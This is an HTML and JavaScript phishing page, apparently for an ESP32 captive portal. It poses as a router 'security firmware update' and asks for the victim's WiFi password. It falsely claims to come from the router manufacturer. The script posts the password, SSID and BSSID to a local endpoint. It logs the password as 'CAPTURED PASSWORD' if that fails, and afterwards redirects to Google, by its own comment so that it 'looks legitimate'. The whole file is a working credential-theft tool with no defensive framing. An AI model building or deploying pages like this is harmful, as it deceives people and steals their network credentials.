<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Network Update Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 420px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #667eea;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #fff;
        }
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 8px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #555;
            margin-bottom: 6px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            outline: none;
        }
        input[type="password"]:focus {
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        button:hover { opacity: 0.9; }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .error {
            color: #e74c3c;
            font-size: 13px;
            display: none;
            margin-top: 12px;
        }
        .loading {
            display: none;
            margin-top: 16px;
            color: #666;
            font-size: 14px;
        }
        .loading::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
        .success {
            display: none;
            color: #27ae60;
            font-size: 14px;
            margin-top: 12px;
        }
        .footer-note {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">&#9881;</div>
        <h1>WiFi Network Update</h1>
        <p>Your router requires a security firmware update.<br>
        Please enter your WiFi password below to proceed.</p>

        <form id="passwordForm">
            <div class="form-group">
                <label for="network">Network</label>
                <input type="text" id="network" readonly 
                       style="width:100%;padding:12px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;outline:none;background:#f9f9f9;">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter WiFi password" required autocomplete="off">
            </div>
            <button type="submit" id="submitBtn">Update &amp; Continue</button>
        </form>

        <div class="error" id="errorMsg">Please enter a valid password.</div>
        <div class="loading" id="loadingIndicator">Verifying password</div>
        <div class="success" id="successMsg">&#10003; Update successful! Redirecting...</div>
        
        <div class="footer-note">
            This is a legitimate security update from your router manufacturer.
        </div>
    </div>

    <script>
        // Get SSID from URL parameter or use default
        const params = new URLSearchParams(window.location.search);
        const ssid = params.get('ssid') || 'WiFi-Network';
        document.getElementById('network').value = ssid;

        const form = document.getElementById('passwordForm');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const successMsg = document.getElementById('successMsg');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const password = passwordInput.value.trim();

            if (!password || password.length < 8) {
                errorMsg.textContent = 'Password must be at least 8 characters.';
                errorMsg.style.display = 'block';
                return;
            }
            errorMsg.style.display = 'none';
            submitBtn.disabled = true;
            loadingIndicator.style.display = 'block';

            try {
                // 👇 CHANGE 1: ESP32 captive portal endpoint
                const response = await fetch('/api/captive/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'password=' + encodeURIComponent(password) + 
                          '&ssid=' + encodeURIComponent(ssid) +
                          '&bssid=' + encodeURIComponent(params.get('bssid') || '')
                });
                const result = await response.text();
                loadingIndicator.style.display = 'none';

                if (result === 'OK' || result.includes('"status":"ok"')) {
                    successMsg.style.display = 'block';
                    setTimeout(() => {
                        // 👇 CHANGE 2: Redirect to Google (looks legitimate)
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                } else if (result === 'WRONG' || result.includes('"error"')) {
                    errorMsg.textContent = 'Incorrect password. Please try again.';
                    errorMsg.style.display = 'block';
                    submitBtn.disabled = false;
                    passwordInput.value = '';
                    passwordInput.focus();
                } else {
                    errorMsg.textContent = 'Verification failed. Please try again.';
                    errorMsg.style.display = 'block';
                    submitBtn.disabled = false;
                }
            } catch (err) {
                loadingIndicator.style.display = 'none';
                // 👇 CHANGE 3: If server not reachable, still log the password
                errorMsg.textContent = 'Connection error. Please try again.';
                errorMsg.style.display = 'block';
                submitBtn.disabled = false;
                
                // Fallback: log password anyway (important for demo/offline)
                console.log('CAPTURED PASSWORD:', password, 'for SSID:', ssid);
            }
        });

        // 👇 OPTIONAL: Auto-focus password field
        window.addEventListener('load', function() {
            setTimeout(() => passwordInput.focus(), 500);
        });
    </script>
</body>
</html>
